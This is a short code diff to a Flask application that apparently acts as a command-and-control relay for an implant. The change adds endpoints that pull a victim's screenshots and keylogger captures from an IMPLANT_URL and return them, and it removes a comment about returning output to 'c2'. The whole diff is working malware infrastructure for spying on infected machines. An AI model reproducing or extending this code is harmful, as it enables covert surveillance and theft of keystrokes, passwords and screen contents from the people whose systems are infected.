@@ -1,5 +1,6 @@
 from flask import Flask
 from flask import request as flask_request
+from flask import Response
 import requests
 from urllib.parse import urljoin
 from utils import *
@@ -21,7 +22,16 @@ def send_sql():
     print(ret.text)
     return ret.text 
 
-# Return output to c2
+@app.post('/shot')
+def send_screenshot():
+    res = requests.get(urljoin(IMPLANT_URL, "/shot"))
+    img_data = res.content
+    return Response(img_data, mimetype="image/png")
+
+@app.post('/key')
+def send_keylog():
+    res = requests.post(urljoin(IMPLANT_URL, "/key"))
+    return res.content
 
 # Start app
 if __name__ == "__main__":
